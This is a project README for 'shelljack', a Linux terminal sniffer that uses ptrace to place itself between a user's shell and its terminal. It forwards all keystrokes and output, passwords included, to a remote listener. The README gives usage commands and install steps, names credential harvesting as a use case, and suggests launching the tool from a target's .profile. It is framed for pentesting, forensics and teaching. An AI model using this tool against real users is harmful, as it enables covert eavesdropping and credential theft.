# shelljack #

_shelljack_ is a [Linux](http://en.wikipedia.org/wiki/Linux) [terminal](http://en.wikipedia.org/wiki/Computer_terminal) sniffer.

**What is a "terminal sniffer"?**

A terminal sniffer is a piece of software that inspects user [I/O](http://en.wikipedia.org/wiki/I/o) as it crosses the terminal. This is similar to a [keystroke logger](http://en.wikipedia.org/wiki/Keystroke_logging), but in addition to reporting all of the keystrokes put into the terminal, _shelljack_ also reports all of the data returned back out through the terminal.

**Is it a [kernel module](http://en.wikipedia.org/wiki/Kernel_module)?**

No. _shelljack_ works entirely in [user space](http://en.wikipedia.org/wiki/User_space).

**What is "shelljacking"?**

This is the term I use to describe a very specific type of terminal sniffing attack. _shelljack_ performs a [pseudo-terminal](http://en.wikipedia.org/wiki/Pseudo_terminal) [mitm attack](http://en.wikipedia.org/wiki/Man-in-the-middle_attack). It was designed to be used against a [session leader](http://linux.die.net/man/7/credentials), which usually means a users [shell](http://en.wikipedia.org/wiki/Unix_shell). It's also important to note that a successful shelljacking means you are now embedded in the traffic flow between user and their shell. *You will be sniffing all of the traffic down the line, including child processes and ssh sessions to other hosts!*

**That's awesome! [1337 h4X0rZ rUL3!!](http://hackertyper.com/)**

While I do think it's pretty neat, this really isn't ["hacking"](http://en.wikipedia.org/wiki/Hacker_%28computer_security%29). There are no exploits here. _shelljack_ takes advantage of Linux [deep magic](http://lxr.linux.no/#linux+v3.9.6/kernel/ptrace.c) that, while often not well understood, is completely legitimate. In order to shelljack a target, you will need the appropriate permissions to do so. 

While this may not be a "[sploit](http://en.wikipedia.org/wiki/Sploit)", it is a very handy tool designed to empower [pentesters](http://en.wikipedia.org/wiki/Pentester), [forensic analysts](http://en.wikipedia.org/wiki/Computer_forensics), and educators.

**Do I need to be root to use it?**

No. You need "appropriate permissions" in order for it to work. That means you will either need to be root, or the uid of the target process. 

**When would I ever need this?**

* As a pentester who has gained execution as a user, you can now shelljack that user for further reconnaissance and credential harvesting.
* As a forensic analyist, you can eavesdrop on the user who is the target of your investigation (after you've recieved the appropriate authority to do so from the heads of Security, Legal, and HR, of course.)
* As a sysadmin, or other educator, to publicly demonstrate why sane file permissions are important. 

**How does it work?**

_shelljack_ is a [terminal emulator](http://en.wikipedia.org/wiki/Terminal_emulator) that uses ptrace to insert itself between the shell and it's [controlling tty](https://github.com/emptymonkey/ctty).

**Tell me more of this [deep magic](http://en.wikipedia.org/wiki/Deep_magic) of which you speak!**

[ptrace](http://en.wikipedia.org/wiki/Ptrace):
ptrace is the debugging interface provided by the Linux kernel. It's wonderful at forcing you to *really* understand the inner workings of a Linux process when you try to use it. The best intro I've seen comes in the form of two articles by Pradeep Padala dating back to 2002: [Playing with ptrace, Part I](http://www.linuxjournal.com/article/6100) and [Playing with ptrace, Part II](http://www.linuxjournal.com/article/6210)

[tty](http://en.wikipedia.org/wiki/Tty_%28Unix%29):
A solid understanding of tty fundamentals is necessary to fully understand and leverage the [command line](http://en.wikipedia.org/wiki/Command_line). This is also a needed skill set for understanding shelljacking. The best tutorial on this topic is easily [The TTY demystified](www.linusakesson.net/programming/tty/) by [Linus Åkesson](http://www.linusakesson.net/pages/me.php). 

**What Architectures / OSs will this run on?**

Currently, _shelljack_ will only run on x86_64 Linux. Since _shelljack_ uses the Linux ptrace interface to inject syscalls into a target process using their assembly form, nothing here is portable. That said, check out my other project, [_ptrace_do_](https://github.com/emptymonkey/ptrace_do). If I get around to supporting _ptrace_do_ for other architectures, then porting _shelljack_ shouldn't be too hard.

# Usage #

	empty@monkey:~$ shelljack --help
	usage: shelljack LISTENER:PORT PID
		LISTENER:	Hostname or IP address of the listener.
		PORT:	Port number that the listener will be listening on.
		PID:	Process ID of the target process.

In order to properly mitm the [signals](http://en.wikipedia.org/wiki/Unix_signal) generated by the controlling tty, _shelljack_ must detach from it's original launch terminal. Because of this, you'll need to set up a listener to catch its eavesdropped output. [Netcat](http://en.wikipedia.org/wiki/Netcat) works nicely for this. (We've chosen localhost and port 9999 here, but _shelljack_ will happily use any [address](http://linux.die.net/man/3/getaddrinfo) that the machine will route.)

Let's do a demo. I'll be running [tty](http://linux.die.net/man/1/tty) in these examples to demonstrate which terminal I'm running various commands in.

Start by setting up a listener:

	empty@monkey:~$ tty
	/dev/pts/0
	empty@monkey:~$ while [ 1 ]; do ncat -l localhost 9999; done

Since this is a demo, let's also examine the shell we want to target:

	empty@monkey:~$ tty
	/dev/pts/3
	empty@monkey:~$ echo $$
	19716
	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/3

Now, launch shelljack against the target pid:

	empty@monkey:~$ tty
	/dev/pts/2
	empty@monkey:~$ shelljack localhost:9999 19716

Back at the listener, you will now see all the I/O in real time as the user interacts with the shelljacked shell. For further evidence of this, lets go examine the target shell again:

	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/4
	empty@monkey:~$ ps j -u empty | grep $$
	19714 19716 19716 19716 pts/4    19867 Ss    1000   0:00 -bash
	    1 19782 19782 19782 pts/3    19782 Ss+   1000   0:00 shelljack localhost 9999 19716

We can see that _shelljack_ has successfully taken over /dev/pts/3, and is serving up /dev/pts/4 for the target shell to consume. It's now in place to mitm the traffic, happily forwarding you a copy of everything it sees, including the input which normally wouldn't be ["echoed"](http://linux.die.net/man/1/stty) to the terminal (e.g. passwords).

Also note, _shelljack_ was designed with the ability to attack the shell that is calling it. This makes it ideal for launching it out of the targets login [configuration files](http://en.wikipedia.org/wiki/Unix_shell#Configuration_files_for_shells). (e.g. .profile)

	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:33 0 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/3
	empty@monkey:~$ shelljack localhost:9999 $$
	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:33 0 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/4

# Prerequisites #

To help with the heavy lifting, I've written two supporting libraries that are both needed by _shelljack_:

* [_ptrace_do_](https://github.com/emptymonkey/ptrace_do): A ptrace library for easy syscall injection in Linux.
* [_ctty_](https://github.com/emptymonkey/ctty): A library and tool for discovering and mapping Controlling TTYs in Linux.

In addition, I've also written another tool that isn't needed by _shelljack_, but helps with tty forensics. 

* [_dumb_](https://github.com/emptymonkey/dumb): A simple tool for stripping control characters and escape sequences from terminal output in Unix/Linux.

# Installation #

	git clone git@github.com:emptymonkey/ptrace_do.git
	cd ptrace_do
	make
	cd ..

	git clone git@github.com:emptymonkey/ctty.git
	cd ctty
	make
	cd ..

	git clone git@github.com:emptymonkey/shelljack.git
	cd shelljack
	make

# Limitations #

As noted in the [tty_ioctl](http://linux.die.net/man/4/tty_ioctl) [manpage](http://en.wikipedia.org/wiki/Manpage), an existing process can only switch controlling ttys if it is a session leader. Because of this, while _shelljack_ will be successful against the shell itself, any *existing* child processes will not be able to switch with it. They won't usually die during the shelljacking, but their I/O will act strangely if it relies on the tty. It is best to target shells that are semi-idle, or attack them during the login process.

# Similar Works #

I wrote _shelljack_ for my own education and as a proof-of-concept. After I had already worked out the difficult bits, I came across several other codebases that used a similar strategy, though generally for a different outcome.

* [retty](http://pasky.or.cz/dev/retty/): retty is a tiny tool that lets you attach processes running on other terminals.
* [neercs](http://caca.zoy.org/wiki/neercs): neercs allows you to detach a session from a terminal.
* [injcode](https://github.com/ThomasHabets/injcode): injcode injects code into a running process.
* [reptyr](http://blog.nelhage.com/2011/02/changing-ctty/): reptyr takes a process that is currently running in one terminal, and transplants it to a new terminal.

As you can see, my idea was hardly original, though I found it odd that nobody was using this technique for terminal sniffing. Some of those code bases are quite well done. If you are interested in learning more about this technique, I would suggest studying them.
